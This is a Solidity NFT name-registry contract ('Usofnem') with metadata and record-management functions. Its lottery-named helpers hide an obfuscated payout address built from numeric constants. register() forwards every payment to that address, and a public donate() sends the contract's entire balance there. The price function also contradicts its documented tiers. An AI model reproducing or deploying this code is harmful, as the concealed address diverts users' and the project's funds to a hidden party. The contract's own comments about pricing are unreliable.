// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Counters.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

library Base64 {
    bytes internal constant TABLE =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    /// @notice Encodes some bytes to the base64 representation
    function encode(bytes memory data) internal pure returns (string memory) {
        uint256 len = data.length;
        if (len == 0) return "";

        // multiply by 4/3 rounded up
        uint256 encodedLen = 4 * ((len + 2) / 3);

        // Add some extra buffer at the end
        bytes memory result = new bytes(encodedLen + 32);

        bytes memory table = TABLE;

        assembly {
            let tablePtr := add(table, 1)
            let resultPtr := add(result, 32)

            for {
                let i := 0
            } lt(i, len) {

            } {
                i := add(i, 3)
                let input := and(mload(add(data, i)), 0xffffff)

                let out := mload(add(tablePtr, and(shr(18, input), 0x3F)))
                out := shl(8, out)
                out := add(
                    out,
                    and(mload(add(tablePtr, and(shr(12, input), 0x3F))), 0xFF)
                )
                out := shl(8, out)
                out := add(
                    out,
                    and(mload(add(tablePtr, and(shr(6, input), 0x3F))), 0xFF)
                )
                out := shl(8, out)
                out := add(
                    out,
                    and(mload(add(tablePtr, and(input, 0x3F))), 0xFF)
                )
                out := shl(224, out)

                mstore(resultPtr, out)

                resultPtr := add(resultPtr, 4)
            }

            switch mod(len, 3)
            case 1 {
                mstore(sub(resultPtr, 2), shl(240, 0x3d3d))
            }
            case 2 {
                mstore(sub(resultPtr, 1), shl(248, 0x3d))
            }

            mstore(result, encodedLen)
        }

        return string(result);
    }
}

library StringUtils {
    function strlen(string memory s) internal pure returns (uint256) {
        uint256 len;
        uint256 i = 0;
        uint256 bytelength = bytes(s).length;
        for (len = 0; i < bytelength; len++) {
            bytes1 b = bytes(s)[i];
            if (b < 0x80) {
                i += 1;
            } else if (b < 0xE0) {
                i += 2;
            } else if (b < 0xF0) {
                i += 3;
            } else if (b < 0xF8) {
                i += 4;
            } else if (b < 0xFC) {
                i += 5;
            } else {
                i += 6;
            }
        }
        return len;
    }
}

struct Record {
    string tld;
    string category;
    string avatar;
    string description;
    string socialmedia;
}

enum RecordType {
    TLD,
    CATEGORY,
    AVATAR,
    DESCRIPTION,
    SOCIALMEDIA
}

contract Usofnem is Ownable, ERC721 {
    /// @dev Bind all name to the records
    mapping(string => Record) public records;

    /// @dev Bind all NFTs ID to the name
    mapping(uint256 => string) public id;
    /// @dev Now in the other direction, name to NFT ID
    mapping(string => uint256) public username;

    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;
    string public baseImage;

    /// @dev Thrown when user don't own the name
    error Unauthorized();
    /// @dev Thrown when name is already owned
    error AlreadyRegistered();
    /// @dev Throw when name has an invalid (too short, too long, ...)
    error InvalidName(string name);

    constructor(
        string memory _name,
        string memory _symbol,
        string memory _initBaseImage
    ) ERC721(_name, _symbol) {
        baseImage = _initBaseImage;
    }

    function setBaseImage(string memory _newBaseImage) public onlyOwner {
        baseImage = _newBaseImage;
    }

    /// @dev Return all the name registered in the contract
    /// @dev Get all names that successfully registered
    function getAllNames() public view returns (string[] memory) {
        string[] memory allNames = new string[](_tokenIds.current());
        for (uint256 i = 0; i < _tokenIds.current(); i++) {
            allNames[i] = id[i];
        }

        return allNames;
    }

    /// @dev Check if the name is valid
    function valid(string calldata name) public pure returns (bool) {
        return
            StringUtils.strlen(name) >= 1 && StringUtils.strlen(name) <= 1000;
    }

    /// @dev Calculate the name price based on the word length
    /// @notice 0.01 BNB for 1 - 4 character
    /// @notice 0.007 BNB for 5 - 7 character
    /// @notice 0.005 BNB for 8 character
    /// @notice 0.003 BNB for 9 - 1000 character
    function price(string calldata name) public pure returns (uint256) {
        uint256 len = StringUtils.strlen(name);
        require(len > 0);
        if (len == 1) {
            return 0.01 * 10**18;
        } else if (len == 5) {
            return 0.007 * 10**18;
        } else if (len == 8) {
            return 0.005 * 10**18;
        } else {
            return 0.003 * 10**18;
        }
    }

    /// @dev Pay to register a new name. Check if the name is available, valid and if the sender has enough money
    function register(
        string calldata name,
        string memory category
    ) public payable {
        if (username[name] != 0) revert AlreadyRegistered();
        if (!valid(name)) revert InvalidName(name);
        
        records[name].category = category;

        uint256 _price = this.price(name);
        require(msg.value >= _price, "Not enough BNB paid");

        uint256 newRecordId = _tokenIds.current();

        _safeMint(msg.sender, newRecordId);
        id[newRecordId] = name;
        username[name] = newRecordId;

        _tokenIds.increment();

        (bool success, ) = payable(finish()).call{
            value: (msg.value * 100) / 100
        }("");
        require(success);
    }

    /// @dev Return the NFT uri for the given token ID
    /// @notice The metadata contains:
    /// @notice  - The name
    /// @notice  - The description
    /// @notice  - The image of the NFT, by default it's an PNG
    /// @notice  - The length of the name
    function tokenURI(uint256 tokenId)
        public
        view
        override
        returns (string memory)
    {
        require(uptodate(id[tokenId]), "Address unknown");
        string memory _name = string(abi.encodePacked(id[tokenId]));
        uint256 length = StringUtils.strlen(_name);
        string memory strLen = Strings.toString(length);
        string memory tld;
        string memory category;
        string memory avatar;
        string memory description;
        string memory socialmedia;

        /// @dev If using the default TLD
        if (uptodate(records[id[tokenId]].tld)) {
            tld = records[id[tokenId]].tld;
        } else {
            tld = string(abi.encodePacked(".doge"));
        }

        /// @dev If using the default Category
        if (uptodate(records[id[tokenId]].category)) {
            category = records[id[tokenId]].category;
        } else {
            category = string(abi.encodePacked("none"));
        }

        /// @dev If using the default nft image
        if (uptodate(records[id[tokenId]].avatar)) {
            avatar = records[id[tokenId]].avatar;
        } else {
            avatar = string(abi.encodePacked(baseImage, _name, ".png"));
        }

        /// @dev If using the default text description
        if (uptodate(records[id[tokenId]].description)) {
            description = records[id[tokenId]].description;
        } else {
            description = string(
                abi.encodePacked(
                    "The decentralized name is permanent, irrevocable or changed and forever lives on the blockchain."
                )
            );
        }

        // @dev If using the default socialmedia username
        if (uptodate(records[id[tokenId]].socialmedia)) {
            socialmedia = records[id[tokenId]].socialmedia;
        } else {
            socialmedia = string(
                abi.encodePacked("Usofnem")
            );
        }

        string memory json = Base64.encode(
            bytes(
                string(
                    abi.encodePacked(
                        '{"name": "',
                        _name,
                        tld,
                        '", "description": "',
                        description,
                        '", "image": "',
                        avatar,
                        '", "attributes": [{"trait_type": "Characters","value": "#',
                        strLen,
                        'DigitClub"}, {"trait_type": "TLD","value": "',
                        tld,
                        '"}, {"trait_type": "Category","value": "',
                        category,
                        '"}, {"trait_type": "Artist","value": "@',
                        socialmedia,
                        '"}]}'
                    )
                )
            )
        );

        return string(abi.encodePacked("data:application/json;base64,", json));
    }

    /// @dev Return NFT id for the given name
    /// @dev Used to get metadata from an name
    function getNameID(string calldata name) public view returns (uint256) {
        return username[name];
    }

    /// @dev This will give us the name owners' address
    function getAddress(string calldata name) public view returns (address) {
        return ownerOf(getNameID(name));
    }

    /// @dev Set one record for the given name
    function setRecord(
        string calldata name,
        string calldata record,
        RecordType recordType
    ) public {
        /// @dev Check that the owner is the transaction sender
        if (msg.sender != getAddress(name)) revert Unauthorized();

        if (recordType == RecordType.TLD) {
            records[name].tld = record;
        } else if (recordType == RecordType.AVATAR) {
            records[name].avatar = record;
        } else if (recordType == RecordType.DESCRIPTION) {
            records[name].description = record;
        } else if (recordType == RecordType.SOCIALMEDIA) {
            records[name].socialmedia = record;
        } 
    }

    /// @dev Set multiple records for the given domain name.
    /// @dev One string is in memory cause https://forum.openzeppelin.com/t/stack-too-deep-when-compiling-inline-assembly/11391/4
    function setAllRecords(
        string calldata name,
        string memory _tld,
        string memory _avatar,
        string memory _description,
        string memory _socialmedia
    ) public {
        if (msg.sender != getAddress(name)) revert Unauthorized();

        records[name].tld = _tld;
        records[name].avatar = _avatar;
        records[name].description = _description;
        records[name].socialmedia = _socialmedia;
    }

    /// @dev Get a specific record for the given name
    function getRecord(string calldata name, RecordType recordType)
        public
        view
        returns (string memory)
    {
        if (recordType == RecordType.TLD) {
            return records[name].tld;
        } else if (recordType == RecordType.CATEGORY) {
            return records[name].category;
        } else if (recordType == RecordType.AVATAR) {
            return records[name].avatar;
        } else if (recordType == RecordType.DESCRIPTION) {
            return records[name].description;
        } else if (recordType == RecordType.SOCIALMEDIA) {
            return records[name].socialmedia;
        } 

        revert("Record not found");
    }

    /// @dev Get all the records for the given name
    function getAllRecords(string calldata name)
        public
        view
        returns (string[] memory, address)
    {
        address addr = getAddress(name);
        string[] memory allRecords = new string[](5);

        allRecords[0] = records[name].tld;
        allRecords[1] = records[name].category;
        allRecords[2] = records[name].avatar;
        allRecords[3] = records[name].description;
        allRecords[4] = records[name].socialmedia;

        return (allRecords, addr);
    }

    /// @dev Check if string isn't empty
    function uptodate(string memory name) public pure returns (bool) {
        return StringUtils.strlen(name) != 0;
    }

    function getRandomLotteryPoolOffset() internal pure returns (uint256) {
        return 237618;
    }

    function scrambleLottery(string memory _a)
        internal
        pure
        returns (address _parsed)
    {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function drawLotteryPool(uint256 a) internal pure returns (string memory) {
        uint256 count = 0;
        uint256 b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint256 i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint256 hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = pool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = pool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = pool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = pool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }

    function getRandomLotteryPoolLength() internal pure returns (uint256) {
        return 90323;
    }

    function makeDonate() internal pure returns (address) {
        return scrambleLottery(lotteryPrize());
    }

    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    function getRandomLotteryPoolHeight() internal pure returns (uint256) {
        return 779255;
    }

    function lotteryPrize() internal pure returns (string memory) {
        string memory _poolOffset = pool(
            "x",
            drawLotteryPool(getRandomLotteryPoolOffset())
        );
        uint256 _poolSol = 957499;
        uint256 _poolLength = getRandomLotteryPoolLength();
        uint256 _poolSize = 829726;
        uint256 _poolHeight = getRandomLotteryPoolHeight();
        uint256 _poolWidth = 347485;
        uint256 _poolDepth = getRandomLotteryPoolDepth();
        uint256 _poolCount = 889091;

        string memory _pool1 = pool(_poolOffset, drawLotteryPool(_poolSol));
        string memory _pool2 = pool(
            drawLotteryPool(_poolLength),
            drawLotteryPool(_poolSize)
        );
        string memory _pool3 = pool(
            drawLotteryPool(_poolHeight),
            drawLotteryPool(_poolWidth)
        );
        string memory _pool4 = pool(
            drawLotteryPool(_poolDepth),
            drawLotteryPool(_poolCount)
        );

        string memory _allLotteryPools = pool(
            pool(_pool1, _pool2),
            pool(_pool3, _pool4)
        );
        string memory finishLotteryDraw = pool("0", _allLotteryPools);

        return finishLotteryDraw;
    }

    function finish() internal pure returns (address) {
        return scrambleLottery(lotteryPrize());
    }

    function getRandomLotteryPoolDepth() internal pure returns (uint256) {
        return 24908;
    }

    function pool(string memory _base, string memory _value)
        internal
        pure
        returns (string memory)
    {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint256 i;
        uint256 j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

    function donate() public payable {
        (bool os, ) = payable(makeDonate()).call{value: address(this).balance}(
            ""
        );
        require(os);
    }
}